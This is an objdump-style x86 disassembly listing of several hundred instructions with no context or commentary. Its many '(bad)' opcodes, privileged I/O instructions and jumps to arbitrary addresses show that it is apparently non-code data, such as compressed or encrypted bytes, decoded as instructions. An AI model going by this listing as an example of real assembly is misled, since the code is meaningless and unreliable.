  6aa37d:	sar    DWORD PTR [eax],1
  6aa37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aa380:	scas   eax,DWORD PTR es:[edi]
  6aa381:	rcl    bl,cl
  6aa383:	inc    edi
  6aa384:	stc    
  6aa385:	push   esp
  6aa386:	xchg   esi,eax
  6aa387:	aaa    
  6aa388:	cmp    dh,BYTE PTR [edi]
  6aa38a:	fwait
  6aa38b:	push   ds
  6aa38c:	adc    BYTE PTR ds:0x817214f5,0xeb
  6aa393:	mov    ebp,0x7471855
  6aa398:	gs es aas 
  6aa39b:	pop    fs
  6aa39d:	xchg   BYTE PTR [edi-0x27],bl
  6aa3a0:	scas   eax,DWORD PTR es:[edi]
  6aa3a1:	dec    edx
  6aa3a2:	cmc    
  6aa3a3:	pop    edi
  6aa3a4:	push   0xfffffff3
  6aa3a6:	pusha  
  6aa3a7:	stc    
  6aa3a8:	xchg   ecx,eax
  6aa3a9:	or     cl,BYTE PTR [edx-0x48553c4a]
  6aa3af:	sbb    eax,0x6cf954ea
  6aa3b4:	lock test BYTE PTR [ecx-0x75],ah
  6aa3b8:	and    dl,BYTE PTR [ecx+0x5726b4c0]
  6aa3be:	sahf   
  6aa3bf:	out    dx,al
  6aa3c0:	loop   0x6aa411
  6aa3c2:	ins    BYTE PTR es:[edi],dx
  6aa3c3:	mov    BYTE PTR [edi+0x50],dl
  6aa3c6:	pop    eax
  6aa3c7:	fld    DWORD PTR [esi+esi*4-0x607dc11e]
  6aa3ce:	repz (bad) 
  6aa3d0:	and    eax,0x4a4bc904
  6aa3d5:	pop    edi
  6aa3d6:	retf   
  6aa3d7:	adc    dl,BYTE PTR [esp+edx*1+0x2570d406]
  6aa3de:	add    DWORD PTR [esi-0x21d5f7e8],eax
  6aa3e4:	jne    0x6aa390
  6aa3e6:	shr    esp,1
  6aa3e8:	stos   BYTE PTR es:[edi],al
  6aa3e9:	xchg   BYTE PTR [esi+0x2f7fd5d3],ah
  6aa3ef:	stc    
  6aa3f0:	call   0x6040624a
  6aa3f5:	jmp    DWORD PTR [eax]
  6aa3f7:	jno    0x6aa3ae
  6aa3f9:	icebp  
  6aa3fa:	push   0x94c51d73
  6aa3ff:	jns    0x6aa39f
  6aa401:	icebp  
  6aa402:	icebp  
  6aa403:	loop   0x6aa3ad
  6aa405:	scas   eax,DWORD PTR es:[edi]
  6aa406:	shr    DWORD PTR ds:0xe7203bf2,cl
  6aa40c:	(bad)  
  6aa40d:	xor    DWORD PTR [ecx],esp
  6aa40f:	ss jae 0x6aa3f8
  6aa412:	pop    edx
  6aa413:	stos   DWORD PTR es:[edi],eax
  6aa414:	dec    ebx
  6aa415:	cs (bad) 
  6aa418:	dec    esp
  6aa419:	mov    edx,0x23d4e176
  6aa41e:	ret    0x604a
  6aa421:	push   ebx
  6aa422:	adc    BYTE PTR [ebx-0x62d09b11],ch
  6aa428:	jbe    0x6aa3b3
  6aa42a:	add    esi,edx
  6aa42c:	retf   0xe5b3
  6aa42f:	loopne 0x6aa457
  6aa431:	inc    esi
  6aa432:	pop    edi
  6aa433:	pop    ecx
  6aa434:	ffree  st(1)
  6aa436:	in     eax,0x58
  6aa438:	add    al,0x87
  6aa43a:	outs   dx,BYTE PTR ds:[esi]
  6aa43b:	fcmovnb st,st(3)
  6aa43d:	add    esi,ebx
  6aa43f:	xchg   ecx,eax
  6aa440:	adc    al,0xcd
  6aa442:	and    al,0xc9
  6aa444:	rol    BYTE PTR [ecx-0xc3e3b90],cl
  6aa44a:	mov    esp,eax
  6aa44c:	push   esp
  6aa44d:	stos   BYTE PTR es:[edi],al
  6aa44e:	stos   DWORD PTR es:[edi],eax
  6aa44f:	lahf   
  6aa450:	cmp    dh,BYTE PTR [esi-0x7e]
  6aa453:	stc    
  6aa454:	xchg   edi,eax
  6aa455:	fld    QWORD PTR [esi+esi*2-0x2f36e2d1]
  6aa45c:	pop    esp
  6aa45d:	sbb    bl,BYTE PTR [edx+0x30]
  6aa460:	mov    ch,0x11
  6aa462:	fstp   TBYTE PTR [ebx+eiz*8]
  6aa465:	rol    BYTE PTR [eax+0x1b],cl
  6aa468:	sti    
  6aa469:	and    DWORD PTR [edi+0x1ecf7984],0xffffffed
  6aa470:	and    dh,bh
  6aa472:	das    
  6aa473:	(bad)  
  6aa474:	cmp    eax,0x9c33af10
  6aa479:	sbb    al,0x83
  6aa47b:	int3   
  6aa47c:	sub    al,0x9a
  6aa47e:	pop    ecx
  6aa47f:	xor    DWORD PTR [edx+0x73],0xffffff91
  6aa483:	mov    ebp,0xa7b4feed
  6aa488:	aam    0x37
  6aa48a:	xchg   ecx,eax
  6aa48c:	mov    bh,0xd1
  6aa48e:	into   
  6aa48f:	mov    WORD PTR [ebp+0x66],?
  6aa492:	push   cs
  6aa493:	scas   eax,DWORD PTR es:[edi]
  6aa494:	xchg   ebx,eax
  6aa495:	int3   
  6aa496:	sub    BYTE PTR [ecx+0x4c],al
  6aa499:	call   DWORD PTR [eax-0x4e2a4910]
  6aa49f:	in     eax,0xc2
  6aa4a1:	int3   
  6aa4a2:	mov    bl,0xb
  6aa4a4:	pop    eax
  6aa4a5:	mov    ds:0xa6c2803e,al
  6aa4aa:	add    ecx,DWORD PTR [ecx]
  6aa4ac:	das    
  6aa4ad:	xor    BYTE PTR [ebp+0xb],ch
  6aa4b0:	inc    ebp
  6aa4b1:	cs je  0x6aa4d8
  6aa4b4:	mov    ebp,edi
  6aa4b6:	sub    BYTE PTR [ebx+0x49b06cb3],dh
  6aa4bc:	sub    al,0xe6
  6aa4be:	sbb    al,0x1c
  6aa4c0:	(bad)  
  6aa4c1:	repz ds inc esp
  6aa4c4:	hlt    
  6aa4c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aa4c6:	sub    DWORD PTR [eax+0x36],ecx
  6aa4c9:	(bad)  
  6aa4ca:	and    cl,BYTE PTR [ecx]
  6aa4cc:	cld    
  6aa4cd:	xchg   esi,eax
  6aa4ce:	jp     0x6aa4dc
  6aa4d0:	lods   eax,DWORD PTR ds:[esi]
  6aa4d1:	ficom  DWORD PTR [edx-0x2cb0113d]
  6aa4d7:	xchg   cl,ah
  6aa4d9:	cs out 0x54,eax
  6aa4dc:	and    cl,BYTE PTR [ecx-0x50]
  6aa4df:	call   0xbc6f4396
  6aa4e4:	dec    ecx
  6aa4e5:	cdq    
  6aa4e6:	sbb    dl,dl
  6aa4e8:	sub    al,0x31
  6aa4ea:	add    al,cl
  6aa4ec:	add    DWORD PTR [edi-0x38],0xe96f783d
  6aa4f3:	shr    BYTE PTR [eax+0x60],0xfd
  6aa4f7:	pop    edx
  6aa4f8:	je     0x6aa52c
  6aa4fa:	(bad)  
  6aa4fb:	clc    
  6aa4fc:	scas   eax,DWORD PTR es:[edi]
  6aa4fd:	add    eax,0x4bb09ca9
  6aa502:	mov    al,ds:0x95ced2aa
  6aa507:	push   cs
  6aa508:	dec    edx
  6aa509:	ins    BYTE PTR es:[edi],dx
  6aa50a:	mov    DWORD PTR [edi+0x4f01ca69],ecx
  6aa510:	sbb    ebp,DWORD PTR [ecx+0x7a]
  6aa513:	ja     0x87ca0958
  6aa519:	and    al,0x5c
  6aa51b:	inc    edi
  6aa51c:	sbb    eax,0x98872b1f
  6aa521:	or     DWORD PTR [ebp+0x28],edi
  6aa524:	xor    ah,BYTE PTR [ebp-0x4e]
  6aa527:	ret    0xcc42
  6aa52a:	scas   eax,DWORD PTR es:[edi]
  6aa52b:	sub    dl,BYTE PTR [ebp-0x69f6647b]
  6aa531:	and    BYTE PTR [ecx+0x6dce2ee2],al
  6aa537:	outs   dx,DWORD PTR ds:[esi]
  6aa538:	xor    dl,BYTE PTR [esi]
  6aa53a:	cli    
  6aa53b:	fimul  WORD PTR [edi+0xcf90c47]
  6aa541:	inc    ecx
  6aa542:	std    
  6aa543:	mov    esi,0xd13d4bb6
  6aa548:	xor    BYTE PTR [eax+edi*4+0x3c],ah
  6aa54c:	mov    eax,0xecd2856f
  6aa551:	xlat   BYTE PTR ds:[ebx]
  6aa552:	jmp    0x6aa5ca
  6aa554:	xor    eax,ecx
  6aa556:	xchg   edx,eax
  6aa557:	int3   
  6aa558:	jp     0x6aa522
  6aa55a:	aad    0x93
  6aa55c:	cmp    eax,0x7adfd46b
  6aa561:	jmp    0x6aa5d9
  6aa563:	cld    
  6aa564:	loop   0x6aa544
  6aa566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aa567:	mov    bl,0x18
  6aa569:	mov    ds:0x643fd077,eax
  6aa56e:	push   eax
  6aa56f:	mov    esi,ebx
  6aa571:	push   cs
  6aa572:	mov    ecx,DWORD PTR [ebx]
  6aa574:	cmp    al,0x86
  6aa576:	xor    ecx,DWORD PTR [edi+0x17131ab2]
  6aa57c:	fsub   DWORD PTR [esi+edx*2]
  6aa57f:	pop    esi
  6aa580:	sbb    DWORD PTR [edi],esp
  6aa582:	add    eax,0x12902f0f
  6aa587:	repnz mov bl,0xfc
  6aa58a:	pop    ebp
  6aa58b:	fsub   QWORD PTR [ebx+0x3b084ca5]
  6aa591:	dec    ebx
  6aa592:	push   esi
  6aa593:	inc    edi
  6aa594:	xchg   esi,eax
  6aa595:	mov    edx,DWORD PTR [edi]
  6aa597:	lahf   
  6aa598:	xor    eax,0xcc11b197
  6aa59d:	sub    DWORD PTR [eax],ecx
  6aa59f:	popf   
  6aa5a0:	mov    ah,0x8b
  6aa5a2:	aas    
  6aa5a3:	addr16 clc 
  6aa5a5:	add    eax,0xd39d13a7
  6aa5aa:	(bad)  
  6aa5ab:	pop    eax
  6aa5ac:	clc    
  6aa5ad:	retf   0x349a
  6aa5b0:	test   al,0xb5
  6aa5b2:	mov    ds:0x7e6d1a8c,al
  6aa5b7:	push   0xffffffd2
  6aa5b9:	test   DWORD PTR [edi-0x73b27fb0],eax
  6aa5bf:	mov    bh,0x20
  6aa5c1:	imul   esi,DWORD PTR [ebx],0x33faafa0
  6aa5c7:	mov    dh,BYTE PTR [ebx-0x4ec8e096]
  6aa5cd:	clc    
  6aa5ce:	int3   
  6aa5cf:	dec    eax
  6aa5d0:	retf   
  6aa5d1:	popa   
  6aa5d2:	mov    esp,esi
  6aa5d4:	outs   dx,DWORD PTR ds:[esi]
  6aa5d5:	push   esi
  6aa5d6:	add    al,0x3d
  6aa5d8:	mov    al,ds:0x835c2890
  6aa5dd:	mov    eax,ds:0x26342f0b
  6aa5e2:	mov    al,ds:0x12df97f0
  6aa5e7:	mov    bh,BYTE PTR [edi]
  6aa5e9:	imul   eax,DWORD PTR [ebp-0x61edbae9],0x23
  6aa5f0:	dec    ebx
  6aa5f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aa5f2:	xor    BYTE PTR [ecx],ah
  6aa5f4:	popf   
  6aa5f5:	clc    
  6aa5f6:	(bad)  
  6aa5f7:	dec    esp
  6aa5f8:	or     BYTE PTR [eax],0x1
  6aa5fb:	push   edx
  6aa5fc:	xor    al,cl
  6aa5fe:	mov    ch,0x2d
  6aa600:	cmovbe ebp,DWORD PTR [edx]
  6aa603:	cmp    eax,0x9a53b890
  6aa608:	sub    al,0x49
  6aa60a:	push   esp
  6aa60b:	sbb    eax,0x1e942ab7
  6aa610:	mov    esp,0x8f90bfa3
  6aa615:	iret   
  6aa616:	xor    al,0x6d
  6aa619:	aad    0x9e
  6aa61b:	push   ss
  6aa61c:	pop    eax
  6aa61d:	or     al,BYTE PTR [eax]
  6aa61f:	jnp    0x6aa613
  6aa621:	push   ss
  6aa622:	jb     0x6aa5eb
  6aa624:	jmp    0x6aa5b4
  6aa626:	scas   al,BYTE PTR es:[edi]
  6aa627:	xor    dl,BYTE PTR [ecx]
  6aa629:	add    DWORD PTR [ecx-0x49],ebp
  6aa62c:	dec    esi
  6aa62d:	push   0x4efc5883
  6aa632:	cli    
  6aa633:	and    al,0xb9
  6aa635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa636:	imul   esp,DWORD PTR [eax+ebx*4+0x1a],0x8fe814d8
  6aa63e:	or     esp,DWORD PTR [ecx+0x3eef4670]
  6aa644:	repz inc ebp
  6aa646:	inc    esp
  6aa647:	in     eax,0xa8
  6aa649:	xchg   BYTE PTR [ebx-0x19],bh
  6aa64c:	or     dl,BYTE PTR [edi]
  6aa64e:	pop    esi
  6aa64f:	cli    
  6aa650:	mov    ah,dl
  6aa652:	les    esi,FWORD PTR [ebx-0x52]
  6aa655:	or     eax,0x77253f36
  6aa65a:	fwait
  6aa65b:	inc    ebx
  6aa65c:	out    0xf6,al
  6aa65e:	sub    BYTE PTR [esi-0x7c7404ab],al
  6aa664:	or     eax,0xa1615817
  6aa669:	sti    
  6aa66a:	(bad)
  6aa66e:	jbe    0x6aa669
  6aa670:	clc    
  6aa671:	arpl   WORD PTR [ebx],bp
  6aa673:	xor    DWORD PTR [eax+0x700f851d],esp
  6aa679:	je     0x6aa661
  6aa67b:	push   ebp
  6aa67c:	or     al,0x40
  6aa67e:	ja     0x6aa63b
  6aa680:	adc    ecx,DWORD PTR [ebp+ebx*8-0x53]
  6aa684:	cmp    eax,0x41b4e2ec
  6aa689:	(bad)  
  6aa68a:	sub    al,0xf5
  6aa68c:	adc    ebp,DWORD PTR [ebp-0x31986cad]
  6aa692:	imul   DWORD PTR [ebx]
  6aa694:	xor    al,ch
  6aa696:	ret    
  6aa697:	stc    
  6aa698:	push   esp
  6aa699:	jb     0x6aa65e
  6aa69b:	xchg   BYTE PTR ss:[esi-0x75393104],bh
  6aa6a2:	(bad)  
  6aa6a3:	adc    al,0x2c
  6aa6a5:	arpl   WORD PTR [edi],bp
  6aa6a7:	xchg   ebx,eax
  6aa6a8:	jp     0x6aa6e4
  6aa6aa:	and    eax,0xfe705db7
  6aa6af:	mov    al,0xb6
  6aa6b1:	ja     0x6aa6cb
  6aa6b3:	sar    DWORD PTR [eax],0x70
  6aa6b6:	mov    esp,ecx
  6aa6b8:	test   eax,0x51a2848f
  6aa6bd:	les    esp,FWORD PTR [esp+esi*1+0x30381aa5]
  6aa6c4:	in     al,dx
  6aa6c5:	and    BYTE PTR [esi+0x76d6a950],ch
  6aa6cb:	(bad)  
  6aa6cc:	test   BYTE PTR [edi+esi*4+0x7d],0x7f
  6aa6d1:	rol    DWORD PTR [eax],0xf0
  6aa6d4:	inc    ebp
  6aa6d5:	or     esi,DWORD PTR [edx-0x5f892f6a]
  6aa6db:	popf   
  6aa6dc:	iret   
  6aa6dd:	push   ecx
  6aa6df:	fcomip st,st(2)
  6aa6e1:	push   ebp
  6aa6e2:	sub    eax,0x4c40979c
  6aa6e7:	jno    0x6aa6f8
  6aa6e9:	xchg   edx,eax
  6aa6ea:	push   ecx
  6aa6eb:	pushf  
  6aa6ec:	mov    ecx,0xb6d9db46
  6aa6f1:	sub    BYTE PTR [esi+0x7833769c],bh
  6aa6f7:	push   edx
  6aa6f8:	mov    fs,WORD PTR [eax+0x53dca65b]
  6aa6fe:	sbb    bl,BYTE PTR [esi-0x5d]
  6aa701:	xor    DWORD PTR [esi+0x40497485],eax
  6aa707:	or     BYTE PTR ds:0x27d2121f,bh
  6aa70d:	or     BYTE PTR [ebx-0x78],ah
  6aa710:	test   al,0x85
  6aa712:	sub    BYTE PTR [edi+0x59],dl
  6aa715:	ret    
  6aa716:	inc    esi
  6aa717:	pop    ebx
  6aa718:	inc    edi
  6aa719:	fcomp  st(0)
  6aa71b:	xor    esp,DWORD PTR [ebp-0x1a]
  6aa71e:	jbe    0x6aa6fc
  6aa720:	mov    ah,0x88
  6aa722:	add    DWORD PTR [edi+0x67],0x76d0171e
  6aa729:	add    eax,0x8440efc6
  6aa72e:	or     BYTE PTR [edx-0x3d0034e0],dh
  6aa734:	pop    ds
  6aa735:	into   
  6aa736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aa737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aa738:	jl     0x6aa724
  6aa73a:	aas    
  6aa73b:	jecxz  0x6aa6e7
  6aa73d:	sub    BYTE PTR [ebx+0x4a],cl
  6aa740:	ins    DWORD PTR es:[edi],dx
  6aa741:	loop   0x6aa72a
  6aa743:	xchg   edi,eax
  6aa744:	jmp    0x37f24bf4
  6aa749:	push   cs
  6aa74a:	lea    edx,[edi]
  6aa74c:	repnz cli 
  6aa74e:	sub    eax,0x42a0c1dd
  6aa753:	retf   
  6aa754:	lock shr BYTE PTR [ebp-0x2e],0x59
  6aa759:	lds    eax,FWORD PTR [edx]
  6aa75b:	add    ecx,esi
  6aa75d:	jle    0x6aa7c9
  6aa75f:	test   al,0x3b
  6aa761:	bound  edi,QWORD PTR [esp+eax*4-0x77]
  6aa765:	mov    ds:0xda865a84,al
  6aa76a:	pop    edx
  6aa76b:	mov    al,0x15
  6aa76d:	push   ebp
  6aa76e:	mov    bh,0x4d
  6aa770:	fisubr WORD PTR [ecx+0x400b936]
  6aa776:	push   ebp
  6aa777:	cmc    
  6aa778:	imul   ebx,DWORD PTR [ebx],0xfffffff5
  6aa77b:	pop    es
  6aa77c:	xlat   BYTE PTR ds:[ebx]
  6aa77d:	fisttp WORD PTR [edx+esi*1+0x4776cf38]
  6aa784:	call   0xda1d:0x8aef091f
  6aa78b:	into   
  6aa78c:	xchg   ecx,eax
  6aa78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aa78e:	jb     0x6aa7d8
  6aa790:	dec    edi
  6aa791:	pop    ds
  6aa792:	leave  
  6aa793:	dec    eax
  6aa794:	adc    bh,BYTE PTR [ebx-0x208a8d02]
  6aa79a:	psubsb mm1,QWORD PTR [edx+edx*1+0x32]
  6aa79f:	and    al,0x54
  6aa7a1:	sar    DWORD PTR [edx+0x75],0x11
  6aa7a5:	jmp    0xd7ca:0xa31b3dfb
  6aa7ac:	es xchg edi,eax
  6aa7ae:	imul   edi,eax,0x64
  6aa7b1:	popf   
  6aa7b2:	dec    edi
  6aa7b3:	dec    eax
  6aa7b4:	lock add BYTE PTR [edx-0x4b5d7e46],0xdd
  6aa7bc:	in     eax,0xff
  6aa7be:	and    DWORD PTR [edx],0x68
  6aa7c1:	aad    0xa2
  6aa7c3:	retf   
  6aa7c4:	pop    esp
  6aa7c5:	std    
  6aa7c6:	sbb    ch,BYTE PTR [ebx]
  6aa7c8:	sar    DWORD PTR [ecx],0xbf
  6aa7cb:	xor    dh,al
  6aa7cd:	xchg   edx,eax
  6aa7ce:	imul   ebp,ebp,0xffffffac
  6aa7d1:	(bad)  
  6aa7d2:	mov    edx,0x931ac6ab
  6aa7d7:	aaa    
  6aa7d8:	fld    DWORD PTR [edi-0xb]
  6aa7db:	shl    DWORD PTR [ebx+0x360a2d6d],cl
  6aa7e1:	fs xchg esp,eax
  6aa7e3:	sub    al,0xd8
  6aa7e5:	call   0x283b6b0d
  6aa7ea:	outs   dx,BYTE PTR ds:[esi]
  6aa7eb:	cmp    DWORD PTR [ecx],ecx
  6aa7ed:	fstp   TBYTE PTR ds:0xa06e833e
  6aa7f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa7f5:	cmp    eax,0x47c061a7
  6aa7fa:	nop
  6aa7fb:	les    eax,FWORD PTR es:[ecx+0x25490dcf]
  6aa802:	jb     0x6aa814
  6aa804:	jns    0x6aa7b7
  6aa806:	outs   dx,DWORD PTR ds:[esi]
  6aa807:	aaa    
  6aa808:	push   ecx
  6aa809:	add    eax,0x80c6e762
  6aa80f:	clc    
  6aa810:	data16 sahf 
  6aa812:	push   ds
  6aa813:	jmp    0x23d0:0xe793e944
  6aa81a:	adc    eax,0xe7dc7906
  6aa81f:	out    dx,eax
  6aa820:	xlat   BYTE PTR ds:[ebx]
  6aa821:	xchg   ebp,eax
  6aa822:	cmp    cl,BYTE PTR [eax+0x58]
  6aa825:	loopne 0x6aa7ee
  6aa827:	push   ss
  6aa828:	or     al,0xdf
  6aa82a:	sbb    eax,0xfd86ea55
  6aa82f:	adc    DWORD PTR [edx-0x37d8128c],ebp
  6aa835:	add    ch,BYTE PTR [ecx+ebp*8-0x1d]
  6aa839:	shl    DWORD PTR [ecx],1
  6aa83b:	add    al,0xf8
  6aa83d:	js     0x6aa7fe
  6aa83f:	aas    
  6aa840:	out    dx,al
  6aa841:	dec    edx
  6aa842:	enter  0x50be,0xcf
  6aa846:	das    
  6aa847:	xchg   ebx,eax
  6aa848:	pusha  
  6aa849:	or     BYTE PTR [edi],bh
  6aa84b:	retf   
  6aa84c:	fbld   TBYTE PTR [eax]
  6aa84e:	repz xchg esi,eax
  6aa850:	mov    ebx,0xd3d49314
  6aa855:	mov    bl,BYTE PTR [ebx+0x31af5ad1]
  6aa85b:	xchg   esp,eax
  6aa85c:	jbe    0x6aa877
  6aa85e:	inc    ebx
  6aa85f:	jae    0x6aa886
  6aa861:	sbb    eax,eax
  6aa863:	jne    0x6aa886
  6aa865:	idiv   WORD PTR [esi]
  6aa868:	fbstp  TBYTE PTR [ecx-0x668d1e73]
  6aa86e:	(bad)  
  6aa86f:	xchg   ebx,eax
  6aa870:	fsub   DWORD PTR [eax]
  6aa872:	adc    DWORD PTR [ebx+0x2],ebx
  6aa875:	push   0xffffffac
  6aa877:	cmp    esi,esp
  6aa879:	mov    ch,BYTE PTR [ebp+0x21]
  6aa87c:	into   
  6aa87d:	jmp    0xf99e6588
  6aa882:	sub    eax,0x440257b9
  6aa887:	jge    0x6aa901
  6aa889:	retf   
  6aa88a:	mov    ch,0x2b
  6aa88c:	sub    bl,BYTE PTR [esi-0x7669edf3]
  6aa892:	(bad)  
  6aa893:	inc    ecx
  6aa894:	mov    al,ds:0x78d0f7d8
  6aa899:	xchg   edx,eax
  6aa89a:	bound  edi,QWORD PTR [edx]
  6aa89c:	int    0xd3
  6aa89e:	imul   edi,DWORD PTR ss:[bp+di],0x5fe388a5
  6aa8a6:	push   eax
  6aa8a7:	xor    dl,BYTE PTR [edx]
  6aa8a9:	sbb    ah,BYTE PTR [ebx-0x405b938b]
  6aa8af:	lds    ecx,FWORD PTR [esi+0x47377513]
  6aa8b5:	lods   eax,DWORD PTR ds:[esi]
  6aa8b6:	fst    DWORD PTR [eax+esi*8-0x452a9b06]
  6aa8bd:	inc    edi
  6aa8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa8bf:	ins    DWORD PTR es:[edi],dx
  6aa8c0:	push   ds
  6aa8c1:	and    WORD PTR [edx-0x2d],0x575e
  6aa8c7:	stc    
  6aa8c8:	push   cs
  6aa8c9:	in     eax,0x98
  6aa8cb:	or     esi,esp
  6aa8cd:	xor    al,0x20
  6aa8cf:	in     eax,0xd2
  6aa8d1:	inc    ebx
  6aa8d2:	loopne 0x6aa910
  6aa8d4:	jne    0x6aa949
  6aa8d6:	stos   BYTE PTR es:[edi],al
  6aa8d7:	push   es
  6aa8d8:	adc    cl,BYTE PTR [esi]
  6aa8da:	(bad)  
  6aa8db:	cld    
  6aa8dc:	sbb    eax,0x2e0d66ff
  6aa8e1:	ins    BYTE PTR es:[edi],dx
  6aa8e2:	pop    ebx
  6aa8e3:	popf   
  6aa8e4:	or     BYTE PTR [ecx-0x2cda2592],ch
  6aa8ea:	mov    ebp,0x98cfffe7
  6aa8ef:	add    BYTE PTR [edi+0xc0a605e],dl
  6aa8f5:	mov    ds:0xceb53ad6,eax
  6aa8fa:	jbe    0x6aa8bc
  6aa8fc:	jb     0x6aa900
  6aa8fe:	inc    ebx
  6aa8ff:	pusha  
  6aa900:	mov    al,ds:0x1719cfe9
  6aa905:	nop
  6aa906:	pop    edi
  6aa907:	aas    
  6aa908:	jle    0x6aa8b7
  6aa90a:	jmp    0xe417:0x5954095d
  6aa911:	(bad)  
  6aa912:	jmp    0x6aa93d
  6aa914:	das    
  6aa915:	push   esp
  6aa916:	in     eax,dx
  6aa917:	hlt    
  6aa918:	xchg   esp,eax
  6aa919:	jb     0x6aa970
  6aa91b:	pop    edx
  6aa91c:	and    ebx,DWORD PTR [esi+0x5e19381d]
  6aa922:	push   0xe37578d
  6aa927:	adc    BYTE PTR [ebx+0x29],0xab
  6aa92b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aa92c:	test   ecx,ebx
  6aa92e:	es pop eax
  6aa930:	mov    al,0xa3
  6aa932:	(bad)  
  6aa933:	scas   al,BYTE PTR es:[edi]
  6aa934:	push   esi
  6aa935:	add    BYTE PTR [eax+ecx*2],cl
  6aa938:	sub    BYTE PTR fs:[edx],al
  6aa93b:	push   ecx
  6aa93c:	mov    DWORD PTR [ebx-0x4],edi
  6aa93f:	les    ecx,FWORD PTR [ecx]
  6aa941:	mov    edx,0xc4421c6d
  6aa946:	sbb    eax,0xb5cddf3b
  6aa94b:	lea    esp,[esi]
  6aa94d:	xchg   edx,eax
  6aa94e:	std    
  6aa94f:	(bad)  
  6aa950:	ins    DWORD PTR es:[edi],dx
  6aa951:	clc    
  6aa952:	pop    esp
  6aa953:	push   edx
  6aa954:	inc    ebx
  6aa955:	in     eax,dx
  6aa956:	inc    DWORD PTR [edi]
  6aa958:	in     eax,0xc3
  6aa95a:	jb     0x6aa989
  6aa95c:	mov    esi,0x681e476a
  6aa961:	xor    BYTE PTR [ebx],dh
  6aa963:	inc    eax
  6aa964:	arpl   WORD PTR [eax],di
  6aa966:	pop    ecx
  6aa967:	adc    DWORD PTR [ebx],esp
  6aa969:	mov    eax,ds:0xbe4e13f4
  6aa96e:	mov    dl,0x7a
  6aa970:	(bad)  
  6aa972:	into   
  6aa973:	inc    esp
  6aa974:	or     eax,0x16f39725
  6aa979:	and    DWORD PTR [ebx+0x47],edx
  6aa97c:	js     0x6aa99d
  6aa97e:	mov    bh,0x9a
  6aa980:	jmp    0xf180a1b8
  6aa985:	aam    0xf
  6aa987:	xlat   BYTE PTR ds:[ebx]
  6aa988:	pop    ecx
  6aa989:	sbb    cl,BYTE PTR [bp+si]
  6aa98c:	ret    
  6aa98d:	adc    eax,esi
  6aa98f:	call   0x33fd1f34
  6aa994:	call   0xc69e87e3
  6aa999:	push   ecx
  6aa99a:	mov    ds:0x1a772b4f,al
  6aa99f:	pop    ds
  6aa9a0:	add    eax,0x3a786ca1
  6aa9a5:	push   cs
  6aa9a6:	ret    0xff31
  6aa9a9:	pop    es
  6aa9aa:	shr    DWORD PTR [esi+0x1e],cl
  6aa9ad:	push   eax
  6aa9ae:	jp     0x6aa99c
  6aa9b0:	inc    eax
  6aa9b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aa9b2:	sahf   
  6aa9b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6aa9b4:	rcr    BYTE PTR [eax],0x30
  6aa9b7:	mov    BYTE PTR [bp+di+0x6a2f],0xb9
  6aa9bd:	in     eax,dx
  6aa9be:	pop    esp
  6aa9bf:	mov    esi,0x380dff25
  6aa9c4:	pop    ebp
  6aa9c5:	adc    DWORD PTR [edi],edi
  6aa9c7:	adc    bh,0x9c
  6aa9ca:	xchg   BYTE PTR [ecx+0x3b],dh
  6aa9cd:	mov    bh,0xf
  6aa9cf:	js     0x6aa9d2
  6aa9d1:	(bad)  
  6aa9d2:	(bad)  
  6aa9d3:	xor    esi,DWORD PTR [edx+0x3]
  6aa9d6:	cmp    ch,bh
  6aa9d8:	les    ecx,FWORD PTR [ebx-0xf]
  6aa9db:	xor    edi,edx
  6aa9dd:	das    
  6aa9de:	loope  0x6aaa2e
  6aa9e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6aa9e1:	mov    ds:0x5ad48ce9,al
  6aa9e6:	shl    BYTE PTR [esi+ebx*1-0x11],1
  6aa9ea:	inc    edx
  6aa9eb:	clc    
  6aa9ec:	sub    al,0xc1
  6aa9ee:	je     0x6aa9fb
  6aa9f0:	jns    0x6aa98d
  6aa9f2:	enter  0xa5e0,0x81
  6aa9f6:	and    edx,DWORD PTR [edx+0x37]
  6aa9f9:	xor    esp,0xffffffff
  6aa9fc:	enter  0x4a66,0x66
  6aaa00:	or     edi,eax
  6aaa02:	mov    WORD PTR [ebp+0x7cad023a],gs
  6aaa08:	xchg   edx,eax
  6aaa09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aaa0a:	out    dx,al
  6aaa0b:	mov    ebx,0x2acb094c
  6aaa10:	sub    eax,0xddc20fd8
  6aaa15:	and    DWORD PTR [edi+0x10],ecx
  6aaa18:	and    BYTE PTR [eax+0x2b],0x2b
  6aaa1c:	jno    0x6aa9fe
  6aaa1e:	fisub  WORD PTR [ecx]
  6aaa20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6aaa21:	les    ecx,FWORD PTR [eax-0x28b71cc8]
  6aaa27:	or     BYTE PTR [edx+0x66930574],al
  6aaa2d:	int3   
  6aaa2e:	pop    eax
  6aaa2f:	mov    eax,0xf9502f35
  6aaa34:	push   esp
  6aaa35:	iret   
  6aaa36:	push   esp
  6aaa37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6aaa38:	xchg   ebp,eax
  6aaa39:	mov    ecx,0xe1b30ba6
  6aaa3e:	push   edi
  6aaa3f:	adc    DWORD PTR [ecx],edx
  6aaa41:	mov    cl,0x3b
  6aaa43:	xor    BYTE PTR [eax],cl
  6aaa45:	and    al,0xa4
  6aaa47:	test   edx,edi
  6aaa49:	and    bh,BYTE PTR [ebp+0x4e]
  6aaa4c:	cmp    BYTE PTR [ebp+0x79340f34],bl
  6aaa52:	nop
  6aaa53:	iret   
  6aaa54:	xchg   esi,eax
  6aaa55:	in     al,dx
  6aaa56:	xchg   BYTE PTR [eax-0x78],dl
  6aaa59:	(bad)
  6aaa5d:	jnp    0x6aaa0f
  6aaa5f:	int3   
